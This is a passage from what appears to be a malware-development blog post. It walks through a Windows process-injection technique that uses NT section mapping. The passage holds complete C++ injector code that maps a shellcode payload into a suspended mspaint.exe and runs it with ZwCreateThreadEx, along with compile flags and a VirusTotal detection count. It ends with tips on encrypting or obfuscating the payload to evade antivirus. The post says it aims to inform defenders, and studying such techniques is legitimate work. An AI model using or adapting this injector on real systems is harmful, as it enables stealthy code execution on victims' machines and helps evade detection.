+SectionHandle,
+
+HANDLE
+PVOID*
+ULONG_PTR
+SIZE_T
+PLARGE_INTEGER
+PSIZE_T
+DWORD
+ULONG
+ULONG
+
+ProcessHandle,
+BaseAddress,
+ZeroBits,
+CommitSize,
+SectionOffset,
+ViewSize,
+InheritDisposition,
+AllocationType,
+Win32Protect
+
+);
+// ZwCreateThreadEx
+typedef NTSTATUS(NTAPI* pZwCreateThreadEx)(
+_Out_ PHANDLE
+ThreadHandle,
+_In_ ACCESS_MASK
+DesiredAccess,
+_In_opt_ POBJECT_ATTRIBUTES
+ObjectAttributes,
+_In_ HANDLE
+ProcessHandle,
+_In_ PVOID
+StartRoutine,
+_In_opt_ PVOID
+Argument,
+_In_ ULONG
+CreateFlags,
+_In_opt_ ULONG_PTR
+ZeroBits,
+_In_opt_ SIZE_T
+StackSize,
+_In_opt_ SIZE_T
+MaximumStackSize,
+_In_opt_ PVOID
+AttributeList
+);
+// ZwUnmapViewOfSection syntax
+typedef NTSTATUS(NTAPI* pZwUnmapViewOfSection)(
+HANDLE
+ProcessHandle,
+BaseAddress
+PVOID
+);
+// ZwClose
+typedef NTSTATUS(NTAPI* pZwClose)(
+_In_ HANDLE
+Handle
+);
+unsigned char my_payload[] =
+// 64-bit meow-meow messagebox
+"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
+"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
+"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
+"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
+"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
+"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
+
+"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
+"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
+"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
+"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
+"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
+"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
+"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
+"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
+"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
+"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
+"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
+"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
+"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
+"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
+"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
+"\x2e\x2e\x5e\x3d\x00";
+int main(int argc, char* argv[]) {
+HANDLE sh; // section handle
+HANDLE th; // thread handle
+STARTUPINFOA si = {};
+PROCESS_INFORMATION pi = {};
+PROCESS_BASIC_INFORMATION pbi = {};
+OBJECT_ATTRIBUTES oa;
+SIZE_T s = 4096;
+LARGE_INTEGER sectionS = { s };
+PVOID rb = NULL; // remote buffer
+PVOID lb = NULL; // local buffer
+ZeroMemory(&amp;si, sizeof(STARTUPINFO));
+ZeroMemory(&amp;pi, sizeof(PROCESS_INFORMATION));
+ZeroMemory(&amp;pbi, sizeof(PROCESS_BASIC_INFORMATION));
+si.cb = sizeof(STARTUPINFO);
+ZeroMemory(&amp;oa, sizeof(OBJECT_ATTRIBUTES));
+HMODULE ntdll = GetModuleHandleA("ntdll");
+pZwCreateSection myZwCreateSection =
+(pZwCreateSection)(GetProcAddress(
+ntdll, "ZwCreateSection"));
+pNtMapViewOfSection myNtMapViewOfSection =
+(pNtMapViewOfSection)(GetProcAddress(
+ntdll, "NtMapViewOfSection"));
+pZwUnmapViewOfSection myZwUnmapViewOfSection =
+(pZwUnmapViewOfSection)(GetProcAddress(
+
+ntdll, "ZwUnmapViewOfSection"));
+pZwCreateThreadEx myZwCreateThreadEx =
+(pZwCreateThreadEx)GetProcAddress(
+ntdll, "ZwCreateThreadEx");
+pZwClose myZwClose =
+(pZwClose)GetProcAddress(
+ntdll, "ZwClose");
+// create process as suspended
+if (!CreateProcessA(NULL,
+(LPSTR) "C:\\windows\\system32\\mspaint.exe",
+NULL, NULL, NULL,
+CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW,
+NULL, NULL, &amp;si, &amp;pi)) {
+printf("create process failed :(\n");
+return -2;
+};
+myZwCreateSection(&amp;sh,
+SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE,
+NULL, &amp;sectionS, PAGE_EXECUTE_READWRITE,
+SEC_COMMIT, NULL);
+printf("section handle: %p.\n", sh);
+// mapping the section into current process
+myNtMapViewOfSection(sh, GetCurrentProcess(), &amp;lb,
+NULL, NULL, NULL,
+&amp;s, 2, NULL, PAGE_EXECUTE_READWRITE);
+printf("local process mapped at address: %p.\n", lb);
+// mapping the section into remote process
+myNtMapViewOfSection(sh, pi.hProcess, &amp;rb,
+NULL, NULL, NULL,
+&amp;s, 2, NULL, PAGE_EXECUTE_READWRITE);
+printf("remote process mapped at address: %p\n", rb);
+// copy payload
+memcpy(lb, my_payload, sizeof(my_payload));
+// unmapping section from current process
+myZwUnmapViewOfSection(GetCurrentProcess(), lb);
+printf("mapped at address: %p.\n", lb);
+myZwClose(sh);
+sh = NULL;
+
+// create new thread
+myZwCreateThreadEx(&amp;th, 0x1FFFFF, NULL, pi.hProcess,
+rb, NULL, CREATE_SUSPENDED, 0, 0, 0, 0);
+printf("thread: %p.\n", th);
+ResumeThread(pi.hThread);
+myZwClose(pi.hThread);
+myZwClose(th);
+return 0;
+}
+demo</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to compile our example: x86_64-w64-mingw32-g++ hack.cpp -o hack.exe -mconsole \ -I/usr/share/mingw-w64/include/ -s -ffunction-sections \ -fdata-sections -Wno-write-strings -fno-exceptions \ -fmerge-all-constants -static-libstdc++ -static-libgcc \ -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, see everything in action! In our case victim machine is Windows 10 x64:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">We can see that everything was completed perfectly :) Then, let’s go to upload our malware to VirusTotal:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">https://www.virustotal.com/gui/file/cca1a55dd587cb3e6b4768e6d4febe2966741063 e6beac5951f119bf2ba193ae/detection So, 5 of 67 AV engines detect our file as malicious. Moneta64.exe result:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">If we want, for better result, we can add payload encryption with key or obfuscate functions, or combine both of this techniques. I hope this post spreads awareness to the blue teamers of this interesting technique, and adds a weapon to the red teamers arsenal. CreateProcessA ZwCreateSection <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">NtMapViewOfSection</code> ZwUnmapViewOfSection ZwClose Moneta64.exe source code in Github</p></main></body></html>
